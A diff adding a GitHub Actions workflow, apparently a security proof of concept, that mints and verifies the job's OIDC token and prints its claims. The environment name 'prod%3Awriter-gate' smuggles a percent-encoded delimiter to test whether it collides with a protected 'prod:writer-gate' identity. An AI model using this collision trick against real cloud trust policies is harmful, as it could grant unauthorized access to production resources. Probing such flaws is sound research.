@@ -1,0 +1,35 @@
+name: Attacker percent collision
+on:
+  push:
+    branches: [writer-attack]
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  token:
+    runs-on: ubuntu-latest
+    environment: 'prod%3Awriter-gate'
+    steps:
+      - name: Mint, verify, print safe metadata only
+        shell: bash
+        run: |
+          node <<'NODE'
+          const crypto = require('crypto');
+          (async () => {
+            const rr = await fetch(process.env.ACTIONS_ID_TOKEN_REQUEST_URL, {headers:{Authorization:'Bearer '+process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN}});
+            if (!rr.ok) throw new Error('token request '+rr.status);
+            const token = (await rr.json()).value;
+            const [h,p,s] = token.split('.');
+            const dec = x => Buffer.from(x.replace(/-/g,'+').replace(/_/g,'/').padEnd(Math.ceil(x.length/4)*4,'='));
+            const header = JSON.parse(dec(h)); const claims=JSON.parse(dec(p));
+            const cfg=await (await fetch(claims.iss+'/.well-known/openid-configuration')).json();
+            const jwks=await (await fetch(cfg.jwks_uri)).json(); const jwk=jwks.keys.find(k=>k.kid===header.kid);
+            const ok=crypto.verify('RSA-SHA256',Buffer.from(h+'.'+p),crypto.createPublicKey({key:jwk,format:'jwk'}),dec(s));
+            console.log('JWT_LEN='+token.length);
+            console.log('JWT_SHA256='+crypto.createHash('sha256').update(token).digest('hex'));
+            console.log('SIG_VALID='+ok);
+            console.log('ISS='+claims.iss); console.log('AUD='+claims.aud); console.log('SUB='+claims.sub);
+            console.log('ENVIRONMENT_FLAT='+claims.environment); console.log('REF_FLAT='+claims.ref);
+            console.log('ACTOR_FLAT='+claims.actor); console.log('TRIGGERING_ACTOR_FLAT='+claims.triggering_actor);
+          })();
+          NODE
